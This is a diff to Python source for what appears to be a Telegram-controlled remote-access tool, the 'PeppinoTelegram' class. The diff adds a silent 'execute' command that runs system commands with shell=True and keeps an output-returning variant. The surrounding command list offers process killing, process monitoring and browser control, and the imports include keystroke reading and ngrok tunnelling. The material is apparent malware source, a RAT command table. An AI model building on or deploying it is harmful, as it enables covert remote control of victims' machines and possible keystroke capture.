@@ -63,6 +63,8 @@ from os import system, remove, getenv, getcwd, listdir, name, getlogin, chmod, r
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 from os.path import join, abspath, isfile, exists, dirname, realpath, split as pathsplit, basename, getsize
 
+#TODO: fix ececute
+
 #UTILS
 import pyngrok
 from utils import *
@@ -464,7 +466,8 @@ class PeppinoTelegram:
             Command("browser", browseropen, "Open URL in browser.", "🦑 Misc", "🌐 Browser"),
 
             # 💻 System Control
-            Command("execute", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "💻 System Control", "⚙️ Execute"),
+            Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "💻 System Control", "⚙️ Execute"),
+            Command("execute", self.execute, None, None, None),
             Command("processkiller", self.process_killer, "Kill process from list.", "💻 System Control", "💀 Process Killer"),
             Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "💻 System Control", "🛑 Terminate Process"),
             Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "💻 System Control", "➕ Procmon Add"),
